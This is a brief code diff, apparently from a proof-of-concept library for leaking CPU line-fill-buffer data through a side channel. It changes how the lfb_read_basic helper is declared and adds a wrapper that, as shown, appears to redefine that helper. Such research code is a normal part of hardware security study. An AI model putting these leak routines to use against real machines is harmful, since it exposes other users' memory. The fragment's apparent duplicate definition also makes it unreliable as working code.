@@ -156,7 +156,7 @@ static inline __attribute__((always_inline)) void lfb_leak(void* mem, uint8_t* p
     //asm volatile("mfence\n");
 }
 
-static inline __attribute__((always_inline)) int lfb_read_basic(void *mem, int offset) {
+int lfb_read_basic(void *mem, int offset) {
     int i = 0;
     flush_mem(mem);
     lfb_leak(mem, ptr + offset);
@@ -234,6 +234,8 @@ int lfb_read_offset(void *mem, int offset) {
     }
     return -1;
 }
+
+int lfb_read_basic(void *mem, int offset){return lfb_read_offset(mem, offset);}
 
 #endif
 
